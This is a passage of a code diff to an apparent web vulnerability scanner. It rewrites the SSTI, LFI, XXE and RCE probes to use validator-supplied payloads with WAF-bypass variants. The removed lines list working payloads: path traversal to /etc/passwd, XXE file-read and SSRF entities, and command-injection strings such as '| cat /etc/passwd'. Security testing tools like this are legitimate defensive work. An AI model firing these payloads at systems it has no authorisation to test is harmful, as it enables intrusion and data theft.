+                            self._log(f"[!] CONFIRMED SSTI{bypass_note} in POST: {test_payload}")
+                            results.append(VulnTestResult(
+                                vuln_type="Server-Side Template Injection (SSTI)",
+                                payload=test_payload,
+                                target_url=endpoint.url,
+                                request_data=json.dumps(data),
+                                response=resp,
+                                is_vulnerable=True,
+                                confidence=confidence,
+                                evidence=f"[CONFIRMED] Math expression evaluated in POST body",
+                                evidence_hash=self._hash_evidence(f"SSTI:{ipayload.canary}:{resp.status_code}")
+                            ))
+                            return results
+        
+        return results
+    
+    def _test_lfi(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
+        """Test for Local File Inclusion / Path Traversal using interactive validation."""
+        results = []
+        
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_lfi_payloads()
+        
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
+        
+        self._log(f"[LFI] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
+        
+        # Common parameters for file inclusion
+        file_params = ["file", "page", "path", "include", "doc", "document", "template", "view", "load", "read", "f"]
+        
+        for param in file_params:
+            for ipayload in interactive_payloads:
+                # Generate WAF bypass variations
+                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "lfi")
+                
+                for test_payload in payload_variations:
+                    test_url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
+                    resp = self._make_request("GET", test_url)
+                    
+                    # Use InteractiveValidator to validate response
+                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                        ipayload,
+                        resp.body,
+                        resp.elapsed_ms,
+                        resp.status_code
+                    )
+                    
+                    if is_vuln:
+                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                        self._log(f"[!] CONFIRMED LFI{bypass_note}: {test_payload[:50]}...")
                         results.append(VulnTestResult(
-                            vuln_type="Server-Side Template Injection (SSTI)",
-                            payload=payload,
-                            target_url=endpoint.url,
-                            request_data=json.dumps(data),
+                            vuln_type="Local File Inclusion (LFI)",
+                            payload=test_payload,
+                            target_url=test_url,
+                            request_data=test_url,
                             response=resp,
                             is_vulnerable=True,
-                            confidence=0.95,
-                            evidence=f"Template expression evaluated in POST body",
-                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                            confidence=confidence,
+                            evidence=f"[CONFIRMED] File content verified: {ipayload.canary}",
+                            evidence_hash=self._hash_evidence(f"LFI:{ipayload.canary}:{resp.status_code}")
                         ))
                         return results
         
         return results
     
-    def _test_lfi(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
-        """Test for Local File Inclusion / Path Traversal."""
-        results = []
-        
-        payloads = [
-            ("../../../etc/passwd", "root:"),
-            ("....//....//....//etc/passwd", "root:"),
-            ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
-            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
-            ("....\\\\....\\\\windows\\\\win.ini", "[fonts]"),
-            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),  # Base64 of "<?php"
-            ("file:///etc/passwd", "root:"),
-        ]
-        
-        # Common parameters for file inclusion
-        file_params = ["file", "page", "path", "include", "doc", "document", "template", "view", "load", "read"]
-        
-        for param in file_params:
-            for payload, expected in payloads:
-                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
-                resp = self._make_request("GET", test_url)
-                
-                if expected in resp.body:
-                    self._log(f"[+] LFI detected: {payload}")
-                    results.append(VulnTestResult(
-                        vuln_type="Local File Inclusion (LFI)",
-                        payload=payload,
-                        target_url=test_url,
-                        request_data=test_url,
-                        response=resp,
-                        is_vulnerable=True,
-                        confidence=0.95,
-                        evidence=f"File contents retrieved: {expected[:50]}...",
-                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
-                    ))
-                    return results
-        
-        return results
-    
     def _test_xxe(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
-        """Test for XML External Entity Injection."""
+        """Test for XML External Entity Injection using interactive validation."""
         results = []
         
-        xxe_payloads = [
-            # File read
-            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>''',
-            # Windows file read
-            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>''',
-            # SSRF via XXE
-            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><data>&xxe;</data>''',
-        ]
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_xxe_payloads()
+        
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
+        
+        self._log(f"[XXE] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
         
         # Look for XML endpoints
         xml_endpoints = [e for e in endpoints if "xml" in e.content_type.lower() or "xml" in e.url.lower()]
         
         # Also try common XML paths
-        xml_paths = ["/api/import", "/upload", "/parse", "/xml", "/data"]
+        xml_paths = ["/api/import", "/upload", "/parse", "/xml", "/data", "/soap", "/xmlrpc"]
         
         for path in xml_paths:
             url = f"{base_url}{path}"
-            for payload in xxe_payloads:
-                resp = self._make_request("POST", url, 
-                    data=payload.encode(),
-                    headers={"Content-Type": "application/xml"}
-                )
+            for ipayload in interactive_payloads:
+                # Generate WAF bypass variations for XXE payload
+                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "xxe")
                 
-                if resp.status_code == 200:
-                    if "root:" in resp.body or "[fonts]" in resp.body:
+                for test_payload in payload_variations:
+                    resp = self._make_request("POST", url, 
+                        data=test_payload.encode(),
+                        headers={"Content-Type": "application/xml"}
+                    )
+                    
+                    # Use InteractiveValidator to validate response
+                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                        ipayload,
+                        resp.body,
+                        resp.elapsed_ms,
+                        resp.status_code
+                    )
+                    
+                    if is_vuln:
+                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                        self._log(f"[!] CONFIRMED XXE{bypass_note}: {url}")
                         results.append(VulnTestResult(
                             vuln_type="XML External Entity (XXE)",
-                            payload=payload[:100] + "...",
+                            payload=test_payload[:100] + "...",
                             target_url=url,
-                            request_data=payload,
+                            request_data=test_payload,
                             response=resp,
                             is_vulnerable=True,
-                            confidence=0.95,
-                            evidence="File contents retrieved via XXE",
-                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                            confidence=confidence,
+                            evidence=f"[CONFIRMED] {evidence}",
+                            evidence_hash=self._hash_evidence(f"XXE:{ipayload.canary}:{resp.status_code}")
                         ))
                         return results
         
         return results
     
     def _test_rce(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
-        """Test for Remote Code Execution / Command Injection."""
+        """Test for Remote Code Execution / Command Injection using interactive validation with WAF bypass."""
         results = []
         
-        # Time-based detection payloads
-        payloads = [
-            ("; sleep 5", 5000),  # Unix
-            ("| sleep 5", 5000),
-            ("& ping -c 5 127.0.0.1 &", 5000),
-            ("`sleep 5`", 5000),
-            ("$(sleep 5)", 5000),
-            ("\nping -c 5 127.0.0.1\n", 5000),
-            # Windows
-            ("& ping -n 5 127.0.0.1 &", 5000),
-            ("| timeout 5", 5000),
-        ]
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_rce_payloads()
         
-        # Output-based detection
-        output_payloads = [
-            ("; id", "uid="),
-            ("| id", "uid="),
-            ("; whoami", "www-data"),
-            ("| cat /etc/passwd", "root:"),
-        ]
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
+        
+        self._log(f"[RCE] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
         
         # Common injection parameters
         cmd_params = ["cmd", "exec", "command", "ping", "query", "host", "ip", "process", "run"]
         
         for param in cmd_params:
-            # Time-based tests
-            for payload, expected_delay in payloads[:4]:  # Limit to avoid timeout
-                test_url = f"{base_url}/?{param}=127.0.0.1{urllib.parse.quote(payload)}"
-                resp = self._make_request("GET", test_url)
+            for ipayload in interactive_payloads:
+                # Generate WAF bypass variations
+                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "rce")
                 
-                if resp.elapsed_ms >= expected_delay:
-                    self._log(f"[+] Potential RCE via time delay: {payload}")
-                    results.append(VulnTestResult(
-                        vuln_type="Remote Code Execution (RCE)",
-                        payload=payload,
-                        target_url=test_url,
-                        request_data=test_url,
-                        response=resp,
-                        is_vulnerable=True,
-                        confidence=0.80,
-                        evidence=f"Time-based RCE detected: {resp.elapsed_ms}ms delay",
-                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.elapsed_ms}")
-                    ))
-                    return results
-            
-            # Output-based tests
-            for payload, expected in output_payloads:
-                test_url = f"{base_url}/?{param}=test{urllib.parse.quote(payload)}"
-                resp = self._make_request("GET", test_url)
-                
-                if expected in resp.body:
-                    results.append(VulnTestResult(
-                        vuln_type="Remote Code Execution (RCE)",
-                        payload=payload,
-                        target_url=test_url,
-                        request_data=test_url,
-                        response=resp,
-                        is_vulnerable=True,
-                        confidence=0.95,
-                        evidence=f"Command output in response: {expected}",
-                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
-                    ))
-                    return results
+                for test_payload in payload_variations:
+                    test_url = f"{base_url}/?{param}=127.0.0.1{urllib.parse.quote(test_payload)}"
+                    resp = self._make_request("GET", test_url)
+                    
+                    # Use InteractiveValidator to validate response
+                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                        ipayload,
+                        resp.body,
+                        resp.elapsed_ms,
+                        resp.status_code
+                    )
+                    
+                    if is_vuln:
+                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                        self._log(f"[!] CONFIRMED RCE{bypass_note} via {ipayload.validation_type}!")
+                        results.append(VulnTestResult(
+                            vuln_type=f"Remote Code Execution ({ipayload.validation_type})",
+                            payload=test_payload,
+                            target_url=test_url,
+                            request_data=test_url,
+                            response=resp,
+                            is_vulnerable=True,
+                            confidence=confidence,
+                            evidence=f"[CONFIRMED] {evidence}",
+                            evidence_hash=self._hash_evidence(f"RCE:{ipayload.validation_type}:{resp.elapsed_ms}")
+                        ))
+                        return results
         
         return results
     
